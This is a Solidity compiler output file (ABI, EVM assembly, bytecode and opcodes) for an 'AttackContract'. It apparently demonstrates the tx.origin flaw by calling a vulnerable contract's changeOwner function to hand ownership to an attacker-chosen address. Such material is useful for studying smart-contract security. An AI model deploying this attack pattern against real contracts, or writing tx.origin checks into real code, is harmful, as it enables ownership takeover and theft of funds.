{
	"telefonica/txOriginWithVul.sol": {
		"AttackContract": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_vulnerableContractAddress",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_newOwner",
							"type": "address"
						}
					],
					"name": "attack",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "vulnerableContract",
					"outputs": [
						{
							"internalType": "contract VulnerableContract",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"telefonica/txOriginWithVul.sol\":388:952  contract AttackContract {... */\n  mstore(0x40, 0x80)\n    /* \"telefonica/txOriginWithVul.sol\":472:606  constructor(address _vulnerableContractAddress) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"telefonica/txOriginWithVul.sol\":571:597  _vulnerableContractAddress */\n  dup1\n    /* \"telefonica/txOriginWithVul.sol\":531:549  vulnerableContract */\n  0x00\n  dup1\n    /* \"telefonica/txOriginWithVul.sol\":531:598  vulnerableContract = VulnerableContract(_vulnerableContractAddress) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"telefonica/txOriginWithVul.sol\":472:606  constructor(address _vulnerableContractAddress) {... */\n  pop\n    /* \"telefonica/txOriginWithVul.sol\":388:952  contract AttackContract {... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  dup1\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_11:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_20\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_10\n  jump\t// in\ntag_20:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:690   */\ntag_12:\n    /* \"#utility.yul\":641:665   */\n  tag_22\n    /* \"#utility.yul\":659:664   */\n  dup2\n    /* \"#utility.yul\":641:665   */\n  tag_11\n  jump\t// in\ntag_22:\n    /* \"#utility.yul\":634:639   */\n  dup2\n    /* \"#utility.yul\":631:666   */\n  eq\n    /* \"#utility.yul\":621:684   */\n  tag_23\n  jumpi\n    /* \"#utility.yul\":680:681   */\n  0x00\n    /* \"#utility.yul\":677:678   */\n  dup1\n    /* \"#utility.yul\":670:682   */\n  revert\n    /* \"#utility.yul\":621:684   */\ntag_23:\n    /* \"#utility.yul\":568:690   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":696:839   */\ntag_13:\n    /* \"#utility.yul\":753:758   */\n  0x00\n    /* \"#utility.yul\":784:790   */\n  dup2\n    /* \"#utility.yul\":778:791   */\n  mload\n    /* \"#utility.yul\":769:791   */\n  swap1\n  pop\n    /* \"#utility.yul\":800:833   */\n  tag_25\n    /* \"#utility.yul\":827:832   */\n  dup2\n    /* \"#utility.yul\":800:833   */\n  tag_12\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":696:839   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":845:1196   */\ntag_3:\n    /* \"#utility.yul\":915:921   */\n  0x00\n    /* \"#utility.yul\":964:966   */\n  0x20\n    /* \"#utility.yul\":952:961   */\n  dup3\n    /* \"#utility.yul\":943:950   */\n  dup5\n    /* \"#utility.yul\":939:962   */\n  sub\n    /* \"#utility.yul\":935:967   */\n  slt\n    /* \"#utility.yul\":932:1051   */\n  iszero\n  tag_27\n  jumpi\n    /* \"#utility.yul\":970:1049   */\n  tag_28\n  tag_8\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":932:1051   */\ntag_27:\n    /* \"#utility.yul\":1090:1091   */\n  0x00\n    /* \"#utility.yul\":1115:1179   */\n  tag_29\n    /* \"#utility.yul\":1171:1178   */\n  dup5\n    /* \"#utility.yul\":1162:1168   */\n  dup3\n    /* \"#utility.yul\":1151:1160   */\n  dup6\n    /* \"#utility.yul\":1147:1169   */\n  add\n    /* \"#utility.yul\":1115:1179   */\n  tag_13\n  jump\t// in\ntag_29:\n    /* \"#utility.yul\":1105:1179   */\n  swap2\n  pop\n    /* \"#utility.yul\":1061:1189   */\n  pop\n    /* \"#utility.yul\":845:1196   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"telefonica/txOriginWithVul.sol\":388:952  contract AttackContract {... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"telefonica/txOriginWithVul.sol\":388:952  contract AttackContract {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x144166ae\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xd018db3e\n      eq\n      tag_4\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"telefonica/txOriginWithVul.sol\":419:463  VulnerableContract public vulnerableContract */\n    tag_3:\n      tag_5\n      tag_6\n      jump\t// in\n    tag_5:\n      mload(0x40)\n      tag_7\n      swap2\n      swap1\n      tag_8\n      jump\t// in\n    tag_7:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"telefonica/txOriginWithVul.sol\":614:949  function attack(address _newOwner) public {... */\n    tag_4:\n      tag_9\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_10\n      swap2\n      swap1\n      tag_11\n      jump\t// in\n    tag_10:\n      tag_12\n      jump\t// in\n    tag_9:\n      stop\n        /* \"telefonica/txOriginWithVul.sol\":419:463  VulnerableContract public vulnerableContract */\n    tag_6:\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"telefonica/txOriginWithVul.sol\":614:949  function attack(address _newOwner) public {... */\n    tag_12:\n        /* \"telefonica/txOriginWithVul.sol\":900:918  vulnerableContract */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"telefonica/txOriginWithVul.sol\":900:930  vulnerableContract.changeOwner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xa6f9dae1\n        /* \"telefonica/txOriginWithVul.sol\":931:940  _newOwner */\n      dup3\n        /* \"telefonica/txOriginWithVul.sol\":900:941  vulnerableContract.changeOwner(_newOwner) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_14\n      swap2\n      swap1\n      tag_15\n      jump\t// in\n    tag_14:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_16\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_16:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_18\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_18:\n      pop\n      pop\n      pop\n      pop\n        /* \"telefonica/txOriginWithVul.sol\":614:949  function attack(address _newOwner) public {... */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7:133   */\n    tag_19:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":84:126   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":77:82   */\n      dup3\n        /* \"#utility.yul\":73:127   */\n      and\n        /* \"#utility.yul\":62:127   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:133   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":139:199   */\n    tag_20:\n        /* \"#utility.yul\":167:170   */\n      0x00\n        /* \"#utility.yul\":188:193   */\n      dup2\n        /* \"#utility.yul\":181:193   */\n      swap1\n      pop\n        /* \"#utility.yul\":139:199   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":205:347   */\n    tag_21:\n        /* \"#utility.yul\":255:264   */\n      0x00\n        /* \"#utility.yul\":288:341   */\n      tag_36\n        /* \"#utility.yul\":306:340   */\n      tag_37\n        /* \"#utility.yul\":315:339   */\n      tag_38\n        /* \"#utility.yul\":333:338   */\n      dup5\n        /* \"#utility.yul\":315:339   */\n      tag_19\n      jump\t// in\n    tag_38:\n        /* \"#utility.yul\":306:340   */\n      tag_20\n      jump\t// in\n    tag_37:\n        /* \"#utility.yul\":288:341   */\n      tag_19\n      jump\t// in\n    tag_36:\n        /* \"#utility.yul\":275:341   */\n      swap1\n      pop\n        /* \"#utility.yul\":205:347   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":353:479   */\n    tag_22:\n        /* \"#utility.yul\":403:412   */\n      0x00\n        /* \"#utility.yul\":436:473   */\n      tag_40\n        /* \"#utility.yul\":467:472   */\n      dup3\n        /* \"#utility.yul\":436:473   */\n      tag_21\n      jump\t// in\n    tag_40:\n        /* \"#utility.yul\":423:473   */\n      swap1\n      pop\n        /* \"#utility.yul\":353:479   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":485:636   */\n    tag_23:\n        /* \"#utility.yul\":560:569   */\n      0x00\n        /* \"#utility.yul\":593:630   */\n      tag_42\n        /* \"#utility.yul\":624:629   */\n      dup3\n        /* \"#utility.yul\":593:630   */\n      tag_22\n      jump\t// in\n    tag_42:\n        /* \"#utility.yul\":580:630   */\n      swap1\n      pop\n        /* \"#utility.yul\":485:636   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":642:823   */\n    tag_24:\n        /* \"#utility.yul\":754:816   */\n      tag_44\n        /* \"#utility.yul\":810:815   */\n      dup2\n        /* \"#utility.yul\":754:816   */\n      tag_23\n      jump\t// in\n    tag_44:\n        /* \"#utility.yul\":749:752   */\n      dup3\n        /* \"#utility.yul\":742:817   */\n      mstore\n        /* \"#utility.yul\":642:823   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":829:1101   */\n    tag_8:\n        /* \"#utility.yul\":947:951   */\n      0x00\n        /* \"#utility.yul\":985:987   */\n      0x20\n        /* \"#utility.yul\":974:983   */\n      dup3\n        /* \"#utility.yul\":970:988   */\n      add\n        /* \"#utility.yul\":962:988   */\n      swap1\n      pop\n        /* \"#utility.yul\":998:1094   */\n      tag_46\n        /* \"#utility.yul\":1091:1092   */\n      0x00\n        /* \"#utility.yul\":1080:1089   */\n      dup4\n        /* \"#utility.yul\":1076:1093   */\n      add\n        /* \"#utility.yul\":1067:1073   */\n      dup5\n        /* \"#utility.yul\":998:1094   */\n      tag_24\n      jump\t// in\n    tag_46:\n        /* \"#utility.yul\":829:1101   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1188:1305   */\n    tag_26:\n        /* \"#utility.yul\":1297:1298   */\n      0x00\n        /* \"#utility.yul\":1294:1295   */\n      dup1\n        /* \"#utility.yul\":1287:1299   */\n      revert\n        /* \"#utility.yul\":1434:1530   */\n    tag_28:\n        /* \"#utility.yul\":1471:1478   */\n      0x00\n        /* \"#utility.yul\":1500:1524   */\n      tag_51\n        /* \"#utility.yul\":1518:1523   */\n      dup3\n        /* \"#utility.yul\":1500:1524   */\n      tag_19\n      jump\t// in\n    tag_51:\n        /* \"#utility.yul\":1489:1524   */\n      swap1\n      pop\n        /* \"#utility.yul\":1434:1530   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1536:1658   */\n    tag_29:\n        /* \"#utility.yul\":1609:1633   */\n      tag_53\n        /* \"#utility.yul\":1627:1632   */\n      dup2\n        /* \"#utility.yul\":1609:1633   */\n      tag_28\n      jump\t// in\n    tag_53:\n        /* \"#utility.yul\":1602:1607   */\n      dup2\n        /* \"#utility.yul\":1599:1634   */\n      eq\n        /* \"#utility.yul\":1589:1652   */\n      tag_54\n      jumpi\n        /* \"#utility.yul\":1648:1649   */\n      0x00\n        /* \"#utility.yul\":1645:1646   */\n      dup1\n        /* \"#utility.yul\":1638:1650   */\n      revert\n        /* \"#utility.yul\":1589:1652   */\n    tag_54:\n        /* \"#utility.yul\":1536:1658   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1664:1803   */\n    tag_30:\n        /* \"#utility.yul\":1710:1715   */\n      0x00\n        /* \"#utility.yul\":1748:1754   */\n      dup2\n        /* \"#utility.yul\":1735:1755   */\n      calldataload\n        /* \"#utility.yul\":1726:1755   */\n      swap1\n      pop\n        /* \"#utility.yul\":1764:1797   */\n      tag_56\n        /* \"#utility.yul\":1791:1796   */\n      dup2\n        /* \"#utility.yul\":1764:1797   */\n      tag_29\n      jump\t// in\n    tag_56:\n        /* \"#utility.yul\":1664:1803   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1809:2138   */\n    tag_11:\n        /* \"#utility.yul\":1868:1874   */\n      0x00\n        /* \"#utility.yul\":1917:1919   */\n      0x20\n        /* \"#utility.yul\":1905:1914   */\n      dup3\n        /* \"#utility.yul\":1896:1903   */\n      dup5\n        /* \"#utility.yul\":1892:1915   */\n      sub\n        /* \"#utility.yul\":1888:1920   */\n      slt\n        /* \"#utility.yul\":1885:2004   */\n      iszero\n      tag_58\n      jumpi\n        /* \"#utility.yul\":1923:2002   */\n      tag_59\n      tag_26\n      jump\t// in\n    tag_59:\n        /* \"#utility.yul\":1885:2004   */\n    tag_58:\n        /* \"#utility.yul\":2043:2044   */\n      0x00\n        /* \"#utility.yul\":2068:2121   */\n      tag_60\n        /* \"#utility.yul\":2113:2120   */\n      dup5\n        /* \"#utility.yul\":2104:2110   */\n      dup3\n        /* \"#utility.yul\":2093:2102   */\n      dup6\n        /* \"#utility.yul\":2089:2111   */\n      add\n        /* \"#utility.yul\":2068:2121   */\n      tag_30\n      jump\t// in\n    tag_60:\n        /* \"#utility.yul\":2058:2121   */\n      swap2\n      pop\n        /* \"#utility.yul\":2014:2131   */\n      pop\n        /* \"#utility.yul\":1809:2138   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2144:2262   */\n    tag_31:\n        /* \"#utility.yul\":2231:2255   */\n      tag_62\n        /* \"#utility.yul\":2249:2254   */\n      dup2\n        /* \"#utility.yul\":2231:2255   */\n      tag_28\n      jump\t// in\n    tag_62:\n        /* \"#utility.yul\":2226:2229   */\n      dup3\n        /* \"#utility.yul\":2219:2256   */\n      mstore\n        /* \"#utility.yul\":2144:2262   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2268:2490   */\n    tag_15:\n        /* \"#utility.yul\":2361:2365   */\n      0x00\n        /* \"#utility.yul\":2399:2401   */\n      0x20\n        /* \"#utility.yul\":2388:2397   */\n      dup3\n        /* \"#utility.yul\":2384:2402   */\n      add\n        /* \"#utility.yul\":2376:2402   */\n      swap1\n      pop\n        /* \"#utility.yul\":2412:2483   */\n      tag_64\n        /* \"#utility.yul\":2480:2481   */\n      0x00\n        /* \"#utility.yul\":2469:2478   */\n      dup4\n        /* \"#utility.yul\":2465:2482   */\n      add\n        /* \"#utility.yul\":2456:2462   */\n      dup5\n        /* \"#utility.yul\":2412:2483   */\n      tag_31\n      jump\t// in\n    tag_64:\n        /* \"#utility.yul\":2268:2490   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa26469706673582212200d152d0359a3c291b8d7721ea12de065bfdaac9a47897a31b262f6b3df34ea7164736f6c63430008180033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561000f575f80fd5b50604051610384380380610384833981810160405281019061003191906100d4565b805f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506100ff565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100a38261007a565b9050919050565b6100b381610099565b81146100bd575f80fd5b50565b5f815190506100ce816100aa565b92915050565b5f602082840312156100e9576100e8610076565b5b5f6100f6848285016100c0565b91505092915050565b6102788061010c5f395ff3fe608060405234801561000f575f80fd5b5060043610610034575f3560e01c8063144166ae14610038578063d018db3e14610056575b5f80fd5b610040610072565b60405161004d9190610197565b60405180910390f35b610070600480360381019061006b91906101ef565b610095565b005b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a6f9dae1826040518263ffffffff1660e01b81526004016100ed9190610229565b5f604051808303815f87803b158015610104575f80fd5b505af1158015610116573d5f803e3d5ffd5b5050505050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f819050919050565b5f61015f61015a6101558461011d565b61013c565b61011d565b9050919050565b5f61017082610145565b9050919050565b5f61018182610166565b9050919050565b61019181610177565b82525050565b5f6020820190506101aa5f830184610188565b92915050565b5f80fd5b5f6101be8261011d565b9050919050565b6101ce816101b4565b81146101d8575f80fd5b50565b5f813590506101e9816101c5565b92915050565b5f60208284031215610204576102036101b0565b5b5f610211848285016101db565b91505092915050565b610223816101b4565b82525050565b5f60208201905061023c5f83018461021a565b9291505056fea26469706673582212200d152d0359a3c291b8d7721ea12de065bfdaac9a47897a31b262f6b3df34ea7164736f6c63430008180033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x384 CODESIZE SUB DUP1 PUSH2 0x384 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x31 SWAP2 SWAP1 PUSH2 0xD4 JUMP JUMPDEST DUP1 PUSH0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0xFF JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xA3 DUP3 PUSH2 0x7A JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xB3 DUP2 PUSH2 0x99 JUMP JUMPDEST DUP2 EQ PUSH2 0xBD JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0xCE DUP2 PUSH2 0xAA JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xE9 JUMPI PUSH2 0xE8 PUSH2 0x76 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0xF6 DUP5 DUP3 DUP6 ADD PUSH2 0xC0 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x278 DUP1 PUSH2 0x10C PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x34 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x144166AE EQ PUSH2 0x38 JUMPI DUP1 PUSH4 0xD018DB3E EQ PUSH2 0x56 JUMPI JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH2 0x40 PUSH2 0x72 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x4D SWAP2 SWAP1 PUSH2 0x197 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x70 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x6B SWAP2 SWAP1 PUSH2 0x1EF JUMP JUMPDEST PUSH2 0x95 JUMP JUMPDEST STOP JUMPDEST PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xA6F9DAE1 DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xED SWAP2 SWAP1 PUSH2 0x229 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x104 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x116 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x15F PUSH2 0x15A PUSH2 0x155 DUP5 PUSH2 0x11D JUMP JUMPDEST PUSH2 0x13C JUMP JUMPDEST PUSH2 0x11D JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x170 DUP3 PUSH2 0x145 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x181 DUP3 PUSH2 0x166 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x191 DUP2 PUSH2 0x177 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1AA PUSH0 DUP4 ADD DUP5 PUSH2 0x188 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 PUSH2 0x1BE DUP3 PUSH2 0x11D JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1CE DUP2 PUSH2 0x1B4 JUMP JUMPDEST DUP2 EQ PUSH2 0x1D8 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x1E9 DUP2 PUSH2 0x1C5 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x204 JUMPI PUSH2 0x203 PUSH2 0x1B0 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x211 DUP5 DUP3 DUP6 ADD PUSH2 0x1DB JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x223 DUP2 PUSH2 0x1B4 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x23C PUSH0 DUP4 ADD DUP5 PUSH2 0x21A JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xD ISZERO 0x2D SUB MSIZE LOG3 0xC2 SWAP2 0xB8 0xD7 PUSH19 0x1EA12DE065BFDAAC9A47897A31B262F6B3DF34 0xEA PUSH18 0x64736F6C6343000818003300000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "126400",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"attack(address)": "infinite",
						"vulnerableContract()": "infinite"
					}
				},
				"methodIdentifiers": {
					"attack(address)": "d018db3e",
					"vulnerableContract()": "144166ae"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 34,
						"contract": "telefonica/txOriginWithVul.sol:AttackContract",
						"label": "vulnerableContract",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(VulnerableContract)31"
					}
				],
				"types": {
					"t_contract(VulnerableContract)31": {
						"encoding": "inplace",
						"label": "contract VulnerableContract",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}